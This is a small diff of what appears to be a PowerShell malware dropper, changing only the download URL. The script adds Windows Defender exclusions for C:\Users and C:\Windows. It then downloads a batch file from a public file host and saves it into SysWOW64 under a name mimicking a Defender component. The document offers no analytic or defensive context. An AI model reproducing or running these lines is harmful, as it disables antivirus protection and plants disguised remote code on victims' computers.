@@ -1,4 +1,4 @@
 Add-MpPreference -ExclusionPath "C:\Users"
 Add-MpPreference -ExclusionPath "C:\Windows"
 
-Invoke-WebRequest -Uri 'https://www.upload.ee/download/16301827/b954050477151e5b87cf/setup.bat' -OutFile 'C:\Windows\SysWOW64\MpCmdStmp.bat'
+Invoke-WebRequest -Uri 'https://www.upload.ee/download/16304248/6b5cbf563dfc1e5c7f97/setup.bat' -OutFile 'C:\Windows\SysWOW64\MpCmdStmp.bat'
